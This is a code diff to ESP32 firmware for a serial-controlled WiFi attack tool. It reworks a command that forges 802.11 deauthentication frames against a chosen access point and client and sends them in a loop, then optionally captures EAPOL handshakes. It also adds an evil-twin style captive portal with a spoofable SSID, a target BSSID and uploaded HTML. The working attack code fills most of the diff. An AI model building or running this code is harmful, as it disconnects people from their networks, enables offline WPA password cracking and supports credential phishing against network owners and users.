@@ -3,6 +3,9 @@
 #include <esp_wifi.h>
 #include "BridgeProtocol.h"
 #include "sniffer.h"
+#include "portal.h"
+#include "mbedtls/base64.h"
+
 
 // ── Chip name ────────────────────────────────────────────────────────────────
 #if defined(CONFIG_IDF_TARGET_ESP32C3)
@@ -17,31 +20,11 @@
 
 BridgeProtocol proto(Serial);
 Sniffer        sniffer;
+PortalManager  portal;
 
-// ── Radio state machine ───────────────────────────────────────────────────────
-//
-// DESIGN RULE: WiFi.mode() is called ONCE in setup() → WIFI_MODE_APSTA.
-// It is NEVER called again anywhere in this file.
-//
-// Why: every WiFi.mode() call on ESP-IDF tears down and rebuilds the wifi
-// task state machine. APSTA → STA takes 3-8 s and can silently fail if a
-// scan or promiscuous callback is still active. STA → APSTA after the scan
-// triggers the same hazard in reverse. This is the root cause of the
-// "second scan returns None / hangs 30 s" bug.
-//
-// Solution: stay in APSTA permanently.
-//   - Scanning: use esp_wifi_scan_* IDF calls directly (they work in APSTA).
-//   - Raw TX:   esp_wifi_80211_tx(WIFI_IF_AP, ...) works in APSTA.
-//   - Sniffing: promiscuous mode works in APSTA.
-//
-// The only shared-radio conflict is scan vs promiscuous — we stop the
-// sniffer before scanning and restart it after if needed.
-
-// ── IDF-level scan (replaces WiFi.scanNetworks) ───────────────────────────────
-// WiFi.scanNetworks() internally checks if mode == STA and refuses to run
-// in APSTA on some IDF versions. We call the IDF API directly which has no
-// such restriction.
+// ── IDF-level scan ───────────────────────────────────────────────────────────
 static volatile bool _scanDone = false;
+static uint16_t g_lastHtmlSeq = 0xFFFF;
 
 static void wifiEventHandler(arduino_event_id_t event) {
     if (event == ARDUINO_EVENT_WIFI_SCAN_DONE) _scanDone = true;
@@ -51,7 +34,7 @@ static int idf_scan_networks(BridgeProtocol& proto) {
     wifi_scan_config_t cfg = {};
     cfg.ssid        = nullptr;
     cfg.bssid       = nullptr;
-    cfg.channel     = 0;       // 0 = all channels
+    cfg.channel     = 0;
     cfg.show_hidden = true;
     cfg.scan_type   = WIFI_SCAN_TYPE_ACTIVE;
     cfg.scan_time.active.min = 100;
@@ -60,18 +43,18 @@ static int idf_scan_networks(BridgeProtocol& proto) {
     _scanDone = false;
     WiFi.onEvent(wifiEventHandler);
 
-    esp_err_t err = esp_wifi_scan_start(&cfg, false);  // non-blocking
+    esp_err_t err = esp_wifi_scan_start(&cfg, false);
     if (err != ESP_OK) return -1;
 
     uint32_t deadline = millis() + 8000;
     while (!_scanDone && millis() < deadline) {
-        proto.update();                    // ← keeps UART RX/TX flowing
+        proto.update();
         vTaskDelay(pdMS_TO_TICKS(20));
     }
 
     if (!_scanDone) {
         esp_wifi_scan_stop();
-        return -1;  // timeout
+        return -1;
     }
 
     uint16_t count = 0;
@@ -79,7 +62,6 @@ static int idf_scan_networks(BridgeProtocol& proto) {
     return (int)count;
 }
 
-// ── helpers ───────────────────────────────────────────────────────────────────
 static bool parseMac(const char* str, uint8_t out[6]) {
     if (!str || !str[0]) return false;
     return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
@@ -102,26 +84,12 @@ static const char* authModeStr(wifi_auth_mode_t mode) {
 }
 
 static void radioIdle() {
-    // Bring radio to a clean idle state without changing the WiFi mode.
-    // Called before scan and before deauth to ensure a known starting point.
     sniffer.stop();
     esp_wifi_set_promiscuous(false);
     vTaskDelay(pdMS_TO_TICKS(80));
 }
 
-// ── Raw frame TX ──────────────────────────────────────────────────────────────
-static void send_raw_frame(const uint8_t* buf, int len) {
-    // Send 3× with 1 ms gap — improves delivery rate on busy channels.
-    // WIFI_IF_AP works in APSTA mode (which we stay in permanently).
-    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
-    vTaskDelay(pdMS_TO_TICKS(1));
-    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
-    vTaskDelay(pdMS_TO_TICKS(1));
-    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
-    vTaskDelay(pdMS_TO_TICKS(1));
-}
-
-// ── Command handler ───────────────────────────────────────────────────────────
+// ── Command Handler ──────────────────────────────────────────────────────────
 void handleCmd(uint8_t id, JsonDocument& doc) {
     const char* cmd = doc["cmd"] | "";
     if (cmd[0] == '\0') {
@@ -129,38 +97,29 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         return;
     }
 
-    // ── PING ─────────────────────────────────────────────────────────────────
+    // ── PING ──────────────────────────────────────────────────────────────
     if (strcmp(cmd, "PING") == 0) {
         proto.sendResp(id, true, "pong");
     }
 
-    // ── STATUS ───────────────────────────────────────────────────────────────
-    else if (strcmp(cmd, "STATUS") == 0) {
+    // ── STATUS ────────────────────────────────────────────────────────────
+    else if (strcmp(cmd, "STATUS") == 0 || strcmp(cmd, "HEAP") == 0) {
         JsonDocument resp;
         resp["ok"]       = true;
         resp["uptime"]   = millis();
         resp["heap"]     = ESP.getFreeHeap();
         resp["chip"]     = CHIP_NAME;
         resp["sniffing"] = sniffer.active();
+        resp["oversized_frames"] = proto.oversizedFrameCount();
         if (sniffer.active()) {
             resp["channel"] = sniffer.channel();
-            resp["hopping"] = sniffer.hopping();
         }
+        resp["portal"]   = portal.isRunning();
         String json; serializeJson(resp, json);
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
     }
 
-    // ── ECHO ─────────────────────────────────────────────────────────────────
-    else if (strcmp(cmd, "ECHO") == 0) {
-        const char* msg = doc["args"]["msg"] | "no msg";
-        JsonDocument resp;
-        resp["ok"]   = true;
-        resp["echo"] = msg;
-        String json; serializeJson(resp, json);
-        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
-    }
-
-    // ── START_SNIFF ───────────────────────────────────────────────────────────
+    // ── START_SNIFF ──────────────────────────────────────────────────────
     else if (strcmp(cmd, "START_SNIFF") == 0) {
         const char* mode      = doc["args"]["mode"] | "fixed";
         bool        eapolOnly = doc["args"]["eapol_only"] | false;
@@ -178,11 +137,11 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
             uint8_t channel = doc["args"]["channel"] | 1;
             ok = sniffer.startFixed(channel);
         }
-        proto.sendResp(id, ok, ok ? "sniffing started"
-                                  : "invalid args (channel must be 1-13)");
+
+        proto.sendResp(id, ok, ok ? "sniffing started" : "invalid channel");
     }
 
-    // ── STOP_SNIFF ────────────────────────────────────────────────────────────
+    // ── STOP_SNIFF ────────────────────────────────────────────────────────
     else if (strcmp(cmd, "STOP_SNIFF") == 0) {
         SniffStats s = sniffer.stats();
         sniffer.stop();
@@ -195,35 +154,27 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
     }
 
-    // ── SET_CHANNEL ───────────────────────────────────────────────────────────
+    // ── SET_CHANNEL ──────────────────────────────────────────────────────
     else if (strcmp(cmd, "SET_CHANNEL") == 0) {
         uint8_t channel = doc["args"]["channel"] | 1;
         bool ok = sniffer.setChannel(channel);
-        proto.sendResp(id, ok, ok ? "channel set"
-                                  : "invalid channel (must be 1-13)");
+            proto.sendResp(id, ok, ok ? "channel set" : "invalid channel (must be 1-13)");
     }
 
-    // ── SCAN_WIFI ─────────────────────────────────────────────────────────────
-    //
-    // Key change: no WiFi.mode() calls. We stay in APSTA the whole time.
-    // We stop the sniffer + promiscuous (they conflict with scan), run the
-    // IDF scan directly, then re-enable promiscuous if sniffing was active.
-    //
+    // ── SCAN_WIFI ─────────────────────────────────────────────────────────
     else if (strcmp(cmd, "SCAN_WIFI") == 0) {
         bool wasSniffing = sniffer.active();
         uint8_t prevChannel = sniffer.channel();
         bool wasHopping = sniffer.hopping();
 
-        radioIdle();    // stop sniffer + promiscuous, no mode change
+        radioIdle();
 
-        // IDF scan — works in APSTA, does not require STA-only mode
         int n = idf_scan_networks(proto);
         if (n < 0) {
             proto.sendResp(id, false, "scan failed");
             return;
         }
 
-        // Retrieve results
         if (n > 0) {
             uint16_t count = (uint16_t)n;
             wifi_ap_record_t* records = (wifi_ap_record_t*)malloc(
@@ -250,38 +201,31 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
             free(records);
         }
 
-        esp_wifi_scan_stop();   // release scan resources
+        esp_wifi_scan_stop();
 
         JsonDocument resp;
-        resp["ok"]    = true;
+        resp["ok"] = true;
         resp["count"] = n;
         String json; serializeJson(resp, json);
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
 
-        Serial.printf("[SCAN] Found %d networks.\n", n);
 
-        // Restore sniffer if it was running before the scan
         if (wasSniffing) {
-            if (wasHopping) {
-                sniffer.startHop(300);
-            } else {
-                sniffer.startFixed(prevChannel);
-            }
-            Serial.println("[SCAN] Sniffer restored.");
+            if (wasHopping) sniffer.startHop(300);
+            else sniffer.startFixed(prevChannel);
         }
     }
 
-
-else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
-        // 1. Step directly into the dynamic arguments payload object
+    // ── DEAUTH / DEAUTH_CAPTURE ──────────────────────────────────────────
+    // ★ FIXED: channel sync, esp_wifi_start(), error checking, for-loop
+    else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
         JsonVariant args = doc["args"];
-        
-        // 2. Safe parsing extraction supporting high iteration limits
+
+        // Robust parsing with sane defaults
         uint8_t  channel    = args["channel"].as<uint8_t>() ? args["channel"].as<uint8_t>() : 1;
-        uint32_t count      = args["count"].as<uint32_t>()   ? args["count"].as<uint32_t>()   : 150; 
+        uint32_t count      = args["count"].as<uint32_t>()   ? args["count"].as<uint32_t>()   : 150;
         uint8_t  reason     = args["reason"].as<uint8_t>()  ? args["reason"].as<uint8_t>()  : 7;
 
-        // Extract pacing configuration interval securely
         uint16_t intervalMs = 100;
         if (args.containsKey("deauth_interval_ms")) {
             intervalMs = args["deauth_interval_ms"].as<uint16_t>();
@@ -289,91 +233,151 @@ else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
             intervalMs = args["interval"].as<uint16_t>();
         }
 
-        // Extract string representations or fall back to standard templates
         const char* bssidStr  = args["bssid"]  | "00:00:00:00:00:00";
         const char* clientStr = args["client"] | "FF:FF:FF:FF:FF:FF";
 
-        uint8_t bssid[6]  = {0};
+        uint8_t bssid[6] = {0};
         uint8_t client[6] = {0};
-        
-        // Parse raw text configurations into physical network arrays
-        parseMac(bssidStr,  bssid);
+        parseMac(bssidStr, bssid);
         parseMac(clientStr, client);
 
+        // Stop sniffing and set radio channel
         radioIdle();
         esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
+        // ★ CRITICAL FIX: sync the AP interface channel with the radio
         wifi_config_t ap_cfg = {};
         if (esp_wifi_get_config(WIFI_IF_AP, &ap_cfg) == ESP_OK) {
-            ap_cfg.ap.channel = channel; // Sync the interface controller context channel
+            ap_cfg.ap.channel = channel;
             esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
         }
+        esp_wifi_start();        // ensure WiFi stack is fully operational
+        delay(250);             // let the radio settle
 
-        // Start the radio engine and force physical RF frequency alignment
-        esp_wifi_start();
-        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
-        
-        // Settlement window to allow hardware locks to stabilize
-        delay(250); 
 
-        // 5. Build raw 802.11 template frame array architecture
-        uint8_t runtime_frame[26] = {
-            0xC0, 0x00,                         // 0-1: Frame Control (Deauth)
-            0x00, 0x00,                         // 2-3: Duration
-            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // 4-9: Addr1 (Destination)
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 10-15: Addr2 (Source)
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 16-21: Addr3 (BSSID Base)
-            0x00, 0x00,                         // 22-23: Sequence Control
-            0x00, 0x07                          // 24-25: Reason Code Default
+        // Build deauth frame template
+        uint8_t deauth_frame[26] = {
+            0xC0, 0x00, 0x00, 0x00,
+            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,   // Addr1 (Client)
+            0x00,0x00,0x00,0x00,0x00,0x00,   // Addr2 (BSSID)
+            0x00,0x00,0x00,0x00,0x00,0x00,   // Addr3 (BSSID)
+            0x00, 0x00, 0x00, 0x07            // Seq + Reason
         };
 
-        // Transfer verified target addresses into frame boundaries
-        memcpy(runtime_frame + 4,  client, 6);
-        memcpy(runtime_frame + 10, bssid,  6);
-        memcpy(runtime_frame + 16, bssid,  6);
+        memcpy(deauth_frame + 4,  client, 6);
+        memcpy(deauth_frame + 10, bssid,  6);
+        memcpy(deauth_frame + 16, bssid,  6);
 
-        uint32_t total_sent  = 0;
-        uint16_t seq_tracker = 0x0010;
+        uint32_t total_sent = 0;
+        uint16_t seq = 0x0010;
 
-        // 6. Production-Scale Transmission Loop
         for (uint32_t i = 0; i < count; i++) {
-            runtime_frame[22] = seq_tracker & 0xFF;
-            runtime_frame[23] = (seq_tracker >> 8) & 0xFF;
-            
-            runtime_frame[24] = 0x00;
-            runtime_frame[25] = reason; 
+            deauth_frame[22] = seq & 0xFF;
+            deauth_frame[23] = (seq >> 8) & 0xFF;
+            deauth_frame[25] = reason;
 
-            // Pass parameters straight to native driver queues
-            esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, runtime_frame, 26, true);
-            if (tx_err == ESP_OK) {
-                total_sent++;
-            }
-            
-            seq_tracker += 0x0010; // Shift sequence controller forward
-            delay(intervalMs);     // Direct loop pacing delay
+            esp_err_t tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, 26, true);
+            if (tx_err == ESP_OK) total_sent++;
+
+            seq += 0x0010;
+            delay(intervalMs);
         }
 
-        // 7. Re-initialize background capture mechanics if requested
+        // Optionally start EAPOL capture after deauth
         if (strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
             sniffer.setEapolFilter(true, bssid);
             sniffer.startFixed(channel);
         }
 
-        // 8. Compile and return final telemetry payload update back to Python script
+        // Send stats
         JsonDocument statsDoc;
-        statsDoc["status"]      = "finished";
-        statsDoc["bssid"]       = bssidStr;
-        statsDoc["client"]      = clientStr;
-        statsDoc["channel"]     = (int)channel;
-        statsDoc["count"]       = (uint32_t)count;
-        statsDoc["interval_ms"] = (int)intervalMs;
-        statsDoc["reason"]      = (int)reason;
-        statsDoc["sent_frames"] = (uint32_t)total_sent;
-        
+        statsDoc["status"]       = "finished";
+        statsDoc["bssid"]        = bssidStr;
+        statsDoc["client"]       = clientStr;
+        statsDoc["channel"]      = (int)channel;
+        statsDoc["count"]        = count;
+        statsDoc["interval_ms"]  = intervalMs;
+        statsDoc["reason"]       = reason;
+        statsDoc["sent_frames"]  = total_sent;
         proto.sendEvent("deauth_stats", statsDoc);
-        
-        // Deliver acknowledgment response token back to the script thread
+
+        proto.sendResp(id, true, "deauth completed");
+    }
+
+    // ── CAPTIVE PORTAL ────────────────────────────────────────────────────
+    else if (strcmp(cmd, "START_PORTAL") == 0) {
+        const char* ssid = doc["args"]["ssid"] | "Home Network";
+        uint8_t channel = doc["args"]["channel"] | 6;
+        const char* bssidStr = doc["args"]["bssid"] | "";
+
+        uint8_t targetBssid[6] = {0};
+        bool hasTarget = parseMac(bssidStr, targetBssid);
+
+        bool started = portal.start(ssid, channel, hasTarget ? targetBssid : nullptr);
+        if (started) {
+            proto.sendResp(id, true, "portal started");
+        } else {
+            proto.sendResp(id, false, "softAP failed");
+        }
+    }
+
+    else if (strcmp(cmd, "STOP_PORTAL") == 0) {
+        portal.stop();
         proto.sendResp(id, true);
+    }
+
+    else if (strcmp(cmd, "RESET_HTML") == 0) {
+        size_t expectedSize = doc["args"]["size"] | 0;
+        bool ok = portal.resetHtml(expectedSize);
+        proto.sendResp(id, ok);
+    }
+
+
+    else if (strcmp(cmd, "SET_HTML_CHUNK") == 0) {
+
+        const char* b64data = doc["args"]["data"] | (const char*)nullptr;
+        bool last           = doc["args"]["last"]  | false;
+
+        if (!b64data) {
+            proto.sendResp(id, false, "missing data");
+            return;
+        }
+
+        size_t b64len = strlen(b64data);
+        size_t outCap = ((b64len + 3) / 4) * 3 + 2;
+
+        // Use heap, not stack
+        uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
+        if (!outBuf) {
+            proto.sendResp(id, false, "oom");
+            return;
+        }
+
+        size_t outLen = 0;
+        int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
+                                        (const unsigned char*)b64data, b64len);
+        if (ret == 0) {
+            portal.setHtmlChunk(outBuf, outLen, last);
+            char msg[32];
+            snprintf(msg, sizeof(msg), "ok %dB->%dB", (int)b64len, (int)outLen);
+            proto.sendResp(id, true);
+        } else {
+            char msg[40];
+            snprintf(msg, sizeof(msg), "b64 fail ret=%d", ret);
+            proto.sendResp(id, false, "decode failed");
+        }
+
+        heap_caps_free(outBuf);
+    }
+
+    else if (strcmp(cmd, "PORTAL_STATUS") == 0) {
+        JsonDocument resp;
+        resp["ok"] = true;
+        resp["running"] = portal.isRunning();
+        resp["html_size"] = portal.getBufferSize();
+        resp["html_complete"] = portal.isComplete();
+        String json; serializeJson(resp, json);
+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
     }
 
     else {
@@ -381,59 +385,92 @@ else if (strcmp(cmd, "DEAUTH") == 0 || strcmp(cmd, "DEAUTH_CAPTURE") == 0) {
     }
 }
 
-// ── ACK handler ──────────────────────────────────────────────────────────────
 void handleAck(uint32_t chunk_index) {
     sniffer.onAck(chunk_index);
 }
 
-// ── Heartbeat ────────────────────────────────────────────────────────────────
 void sendHeartbeat() {
     static uint32_t last = 0;
     if (millis() - last < 5000) return;
     last = millis();
+
     JsonDocument doc;
     doc["uptime"] = millis();
     doc["heap"]   = ESP.getFreeHeap();
     proto.sendEvent("heartbeat", doc);
 }
 
-// ── Setup ─────────────────────────────────────────────────────────────────────
+// ── Setup ──────────────────────────────────────────────────────────────────
 void setup() {
+    Serial.setRxBufferSize(4096);
     Serial.begin(115200);
-    delay(500);
+    delay(800);
 
-    // ── ONE-TIME radio init: APSTA and nothing else ever again ────────────────
-    //
-    // APSTA gives us:
-    //   STA interface  → IDF scan, association (future)
-    //   AP interface   → esp_wifi_80211_tx raw frame injection
-    //
-    // We configure a minimal hidden AP so WIFI_IF_AP is always valid for TX.
-    // ssid_hidden=1 + max_connection=0 means no client can ever associate.
+    // ── ONE-TIME radio init: APSTA and nothing else ever again ──────────────
+    // ★ FIXED: removed the redundant first AP config block.
+    // The one and only WiFi.mode() call is right here.
     WiFi.mode(WIFI_MODE_APSTA);
 
+    // Configure a minimal hidden AP so WIFI_IF_AP is always valid for TX.
     wifi_config_t ap_cfg = {};
-    strcpy((char*)ap_cfg.ap.ssid, "esp32tool");
-    ap_cfg.ap.ssid_len       = 9;
-    ap_cfg.ap.channel        = 1;
+    strcpy((char*)ap_cfg.ap.ssid, "nrcap32");
+    ap_cfg.ap.ssid_len       = 7;
     ap_cfg.ap.ssid_hidden    = 1;
     ap_cfg.ap.max_connection = 0;
+    ap_cfg.ap.channel        = 1;  // default, will be changed by deauth/portal
     esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
 
-    // Promiscuous OFF at boot — sniffer.begin() also ensures this
+    // Ensure promiscuous is OFF at boot
     esp_wifi_set_promiscuous(false);
 
+    // Initialise subsystems
     proto.onCmd(handleCmd);
     proto.onAck(handleAck);
-    sniffer.begin(proto);
 
-    Serial.println("ESP32_READY");
+    proto.onHtml([](const uint8_t* data, size_t len) {
+        if (len < 3) return;  // need at least seq(2) + isLast(1)
+
+        uint16_t seq;
+        memcpy(&seq, data, 2);
+        bool isLast = data[2] != 0;
+        const uint8_t* payload = data + 3;
+        size_t payloadLen = len - 3;
+
+        if (g_lastHtmlSeq != 0xFFFF && seq <= g_lastHtmlSeq) {
+            // old or duplicate chunk — already applied, just re-ACK, don't reapply
+        } else {
+            portal.setHtmlChunk(payload, payloadLen, isLast);
+            g_lastHtmlSeq = seq;
+        }
+
+        JsonDocument doc;
+        doc["ok"]  = true;
+        doc["seq"] = seq;
+        String json;
+        serializeJson(doc, json);
+        proto.sendRaw(TYPE_RESP, 0, (const uint8_t*)json.c_str(), json.length());
+    });
+
+
+    sniffer.begin(proto);
+    portal.begin(proto);
+
 }
 
-// ── Loop ─────────────────────────────────────────────────────────────────────
+// ── Loop ───────────────────────────────────────────────────────────────────
 void loop() {
     proto.update();
     sendHeartbeat();
+    
     sniffer.processQueue();
     sniffer.handleHop();
+    portal.update();
+
+    static uint32_t lastRefresh = 0;
+    if (millis() - lastRefresh > 2500) {
+        lastRefresh = millis();
+        if (sniffer.active()) {
+            // 
+        }
+    }
 }
